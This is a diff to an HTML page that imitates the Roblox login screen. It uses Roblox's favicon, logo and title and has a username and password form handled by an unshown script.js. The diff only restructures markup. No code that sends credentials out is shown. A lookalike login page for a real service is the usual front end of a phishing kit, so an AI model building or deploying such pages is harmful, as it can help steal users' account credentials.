@@ -5,35 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
     <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
-    <!-- Google Fonts for Roblox-like typography -->
     <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
-<body class="dark-theme"> <!-- Roblox defaults to dark mode now for many users, but this structure supports both -->
-    <div class="login-wrapper">
+<body>
+    <div class="login-container">
         <div class="login-card">
-            <div class="logo-container">
-                <!-- Official Roblox Logo SVG/PNG -->
-                <svg width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <div class="logo-section">
+                <!-- Roblox Logo -->
+                <svg class="rbx-logo" width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M14.33 6.5L6.5 10.5V33.5L14.33 37.5L33.5 37.5L37.5 33.5V10.5L29.67 6.5H14.33Z" fill="white"/>
                 </svg>
-                <span class="logo-text">Roblox</span>
+                <span class="rbx-text">Roblox</span>
             </div>
 
             <form id="loginForm" class="login-form">
-                <input type="text" id="username" name="username" placeholder="Password or Email" required>
-                <input type="password" id="password" name="password" placeholder="Password" required>
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Password or Email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
                 
                 <button type="submit" class="login-btn">Log In</button>
                 
-                <div class="links">
-                    <a href="#">I forgot my password</a>
-                    <a href="#">Sign Up</a>
+                <div class="footer-links">
+                    <a href="#" class="forgot-password">I forgot my password</a>
+                    <a href="#" class="sign-up">Sign Up</a>
                 </div>
             </form>
         </div>
     </div>
-
     <script src="script.js"></script>
 </body>
 </html>
